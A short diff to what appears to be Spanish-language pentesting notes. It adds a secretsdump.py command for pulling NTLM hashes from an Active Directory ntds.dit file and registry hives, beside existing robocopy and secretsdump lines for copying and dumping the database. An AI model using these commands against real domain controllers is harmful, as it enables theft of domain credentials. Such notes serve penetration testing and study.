@@ -107,6 +107,8 @@ robocopy /b x:\Windows\NTDS\ . ntds.dit
 - Sacas los datos
 ```bash
 secretsdump.py -system system.save -ntds ntds.dit LOCAL
+
+secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL -just-dc-ntlm
 ```
 
 
